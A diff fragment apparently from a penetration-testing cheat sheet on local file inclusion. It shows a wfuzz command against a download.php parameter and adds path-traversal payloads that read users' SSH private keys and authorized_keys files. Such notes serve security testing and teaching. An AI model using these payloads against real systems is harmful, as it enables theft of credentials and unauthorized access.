@@ -18,7 +18,11 @@ wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?down
 Attempt to read the SSH key
 
 ```
+# check the type of the private key used for authentication
+../../../../../home/<username>/.ssh/authorized_keys
 ../../../../../home/<username>/.ssh/id_rsa
+../../../../../home/<username>/.ssh/id_ecdsa
+../../../../../home/<username>/.ssh/id_dsa
 ```
 
 Attempt to list the directory contents
